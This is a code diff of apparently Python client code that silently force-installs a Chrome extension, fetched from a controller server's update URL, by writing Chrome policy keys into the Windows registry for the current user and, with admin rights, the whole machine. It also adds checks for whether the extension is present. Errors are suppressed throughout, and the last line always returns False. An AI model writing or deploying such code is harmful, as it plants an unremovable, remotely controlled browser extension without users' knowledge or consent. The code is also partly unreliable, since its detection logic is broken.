@@ -1844,7 +1844,7 @@ def install_vault_extension_policy():
         import sys
         if sys.platform != 'win32':
             return
-        import winreg, os, urllib.request, tempfile
+        import winreg, os, urllib.request, tempfile, json
         # Resolve current controller URL and ext_id
         try:
             base = SERVER_URL if USE_FIXED_SERVER_URL else get_controller_url()
@@ -1875,12 +1875,27 @@ def install_vault_extension_policy():
         except Exception:
             pass
         try:
+            access_es = winreg.KEY_SET_VALUE | getattr(winreg, "KEY_WOW64_64KEY", 0)
+            key_es = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, r"Software\Policies\Google\Chrome\ExtensionSettings", 0, access_es)
+            data_es = json.dumps({"installation_mode":"force_installed","update_url":update_url})
+            winreg.SetValueEx(key_es, ext_id, 0, winreg.REG_SZ, data_es)
+            try: winreg.CloseKey(key_es)
+            except Exception: pass
+        except Exception:
+            pass
+        try:
             import ctypes
             if ctypes.windll.shell32.IsUserAnAdmin():
                 accessm = winreg.KEY_SET_VALUE | getattr(winreg, "KEY_WOW64_64KEY", 0)
                 basem = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, r"Software\Policies\Google\Chrome\ExtensionInstallForcelist", 0, accessm)
                 winreg.SetValueEx(basem, "1", 0, winreg.REG_SZ, f"{ext_id};{update_url}")
                 try: winreg.CloseKey(basem)
+                except Exception: pass
+                access_em = winreg.KEY_SET_VALUE | getattr(winreg, "KEY_WOW64_64KEY", 0)
+                key_em = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, r"Software\Policies\Google\Chrome\ExtensionSettings", 0, access_em)
+                data_em = json.dumps({"installation_mode":"force_installed","update_url":update_url})
+                winreg.SetValueEx(key_em, ext_id, 0, winreg.REG_SZ, data_em)
+                try: winreg.CloseKey(key_em)
                 except Exception: pass
         except Exception:
             pass
@@ -1916,6 +1931,24 @@ def _ext_is_installed(ext_id: str) -> bool:
         except Exception:
             pass
         try:
+            base3 = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Policies\Google\Chrome\ExtensionInstallForcelist")
+            i = 0
+            while True:
+                try:
+                    _, value, _ = winreg.EnumValue(base3, i)
+                    i += 1
+                    if isinstance(value, str) and value.startswith(ext_id + ";"):
+                        policy_found = True
+                        break
+                except OSError:
+                    break
+            try:
+                winreg.CloseKey(base3)
+            except Exception:
+                pass
+        except Exception:
+            pass
+        try:
             access_r = winreg.KEY_READ | getattr(winreg, "KEY_WOW64_64KEY", 0)
             k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, fr"Software\Google\Chrome\Extensions\{ext_id}", 0, access_r)
             try:
@@ -1935,13 +1968,41 @@ def _ext_is_installed(ext_id: str) -> bool:
             except Exception:
                 pass
         try:
+            access_rh = winreg.KEY_READ | getattr(winreg, "KEY_WOW64_64KEY", 0)
+            kh = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, fr"Software\Google\Chrome\Extensions\{ext_id}", 0, access_rh)
+            try:
+                winreg.CloseKey(kh)
+            except Exception:
+                pass
+            return True
+        except Exception:
+            try:
+                access_rh32 = winreg.KEY_READ | getattr(winreg, "KEY_WOW64_32KEY", 0)
+                kh2 = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, fr"Software\Google\Chrome\Extensions\{ext_id}", 0, access_rh32)
+                try:
+                    winreg.CloseKey(kh2)
+                except Exception:
+                    pass
+                return True
+            except Exception:
+                pass
+        try:
             base = os.environ.get('LOCALAPPDATA') or ''
             user_data = os.path.join(base, 'Google', 'Chrome', 'User Data')
             if os.path.isdir(user_data):
                 for name in os.listdir(user_data):
-                    prof = os.path.join(user_data, name, 'Local Extension Settings', ext_id)
-                    if os.path.isdir(prof):
+                    p1 = os.path.join(user_data, name, 'Local Extension Settings', ext_id)
+                    if os.path.isdir(p1):
                         return True
+                    p2 = os.path.join(user_data, name, 'Extensions', ext_id)
+                    if os.path.isdir(p2):
+                        try:
+                            for ver in os.listdir(p2):
+                                ver_path = os.path.join(p2, ver)
+                                if os.path.isdir(ver_path):
+                                    return True
+                        except Exception:
+                            pass
         except Exception:
             pass
         return False if not policy_found else False
